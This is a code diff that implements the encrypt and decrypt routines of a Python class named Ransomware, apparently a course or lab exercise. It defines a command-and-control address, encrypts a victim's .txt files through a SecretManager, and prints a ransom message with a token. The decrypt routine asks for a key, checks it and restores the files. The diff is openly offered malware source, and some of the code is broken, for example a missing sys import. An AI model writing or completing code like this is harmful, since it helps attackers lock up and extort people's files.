@@ -1,3 +1,4 @@
+import base64
 import logging
 import socket
 import re
@@ -7,6 +8,8 @@ from secret_manager import SecretManager
 from cryptography.fernet import Fernet
 from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
+import secrets
+from typing import Tuple
 
 CNC_ADDRESS = "cnc:6666"
 TOKEN_PATH = "/root/token"
@@ -49,25 +52,32 @@ class Ransomware:
                 files.append(str(file.resolve()))
         return files
     
-    def do_derivation(self,salt:bytes, key:bytes):
-        # derive a key from the salt and the key
-        salt = bytes("16", "utf8")
-        kdf = PBKDF2HMAC(
-            algorithm=hashes.SHA256(),
-            length=KEY_LENGTH,
-            salt=salt,
-            iterations=ITERATIONS
-        )
-        key = kdf.derive(key) # derive the key
-        return key
+    
+
         
     def encrypt(self):
         # main function for encrypting (see PDF)
-        raise NotImplemented()
+        files = self.get_files(".txt") # get all files
+        secret_manager = SecretManager()
+        secret_manager.setup() # setup the secret manager
+        secret_manager.xorfiles(files) # encrypt the files
+        #print a message with the token with hex format
+        print(ENCRYPT_MESSAGE.format(token=secret_manager.get_hex_token())) 
 
     def decrypt(self):
-        # main function for decrypting (see PDF)
-        raise NotImplemented()
+        # main function for decrypting
+        key = base64.b64decode(input("Enter the key: ")) # get the key from the user
+        secret_manager = SecretManager()
+        if (secret_manager.check_key(key)): #check if the key is correct
+            secret_manager.set_key(key)
+            secret_manager.xorfiles(self.get_files(".txt")) # decrypt the files
+            secret_manager.clean() # clean the secret manager
+            print("Everything is ok , the files have been decrypted")
+            sys.exit(0) # exit with success
+        else:
+            print("Error: Wrong key")
+            # ask for the key again
+            self.decrypt()
 
 if __name__ == "__main__":
     logging.basicConfig(level=logging.DEBUG)
